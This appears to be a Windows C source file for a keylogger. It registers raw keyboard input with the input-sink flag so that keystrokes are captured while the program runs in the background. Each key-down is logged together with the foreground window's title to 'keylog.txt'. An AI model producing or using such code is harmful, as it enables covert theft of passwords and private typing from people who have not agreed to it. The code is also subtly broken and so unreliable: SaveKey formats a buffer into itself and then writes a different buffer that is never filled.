#include "stdafx.h"
#include "RawInputTest.h"
#include "VirtualKeyToAscii.h"
#include <Windows.h>
#include <stdio.h>

void ShowError(char *pszText)
{
	char szErr[MAX_PATH] = { 0 };
	wsprintf(szErr, "%s ERROR [%d]", pszText, GetLastError());
	MessageBoxA(NULL, szErr, "ERROR", MB_OK | MB_ICONERROR);
}

BOOL Init(HWND hWnd)
{
	RAWINPUTDEVICE rawinputDevice = { 0 };
	rawinputDevice.usUsagePage = 0x01;
	rawinputDevice.usUsage = 0x06;
	rawinputDevice.dwFlags = RIDEV_INPUTSINK;
	rawinputDevice.hwndTarget = hWnd;

	BOOL bRet = RegisterRawInputDevices(&rawinputDevice, 1, sizeof(rawinputDevice));
	if (FALSE == bRet)
	{
		ShowError("RegisterRawInputDevices");
		return FALSE;
	}
	return TRUE;
}

BOOL GetData(LPARAM lParam)
{
	RAWINPUT rawinputData = { 0 };
	UINT uiSize = sizeof(rawinputData);

	GetRawInputData((HRAWINPUT)lParam, RID_INPUT, &rawinputData, &uiSize, sizeof(RAWINPUTHEADER));
	if (RIM_TYPEKEYBOARD == rawinputData.header.dwType)
	{
		if ((WM_KEYDOWN == rawinputData.data.keyboard.Message) || (WM_SYSKEYDOWN == rawinputData.data.keyboard.Message))
		{
			SaveKey(rawinputData.data.keyboard.VKey);
		}
	}
	return TRUE;
}

void SaveKey(USHORT usVKey)
{
	char szKey[MAX_PATH] = { 0 };
	char szTitle[MAX_PATH] = { 0 };
	char szText[MAX_PATH] = { 0 };
	FILE *fp = NULL;

	HWND hForegroundWnd = GetForegroundWindow();

	GetWindowText(hForegroundWnd, szTitle, 256);
	lstrcpy(szKey, GetKeyName(usVKey));
	wsprintf(szKey, "[%s] %s\r\n", szTitle, szKey);

	fopen_s(&fp, "keylog.txt", "a+");
	if (NULL == fp)
	{
		ShowError("fopen_s");
		return;
	}
	fwrite(szText, (1 + lstrlen(szText)), 1, fp);
	fclose(fp);

}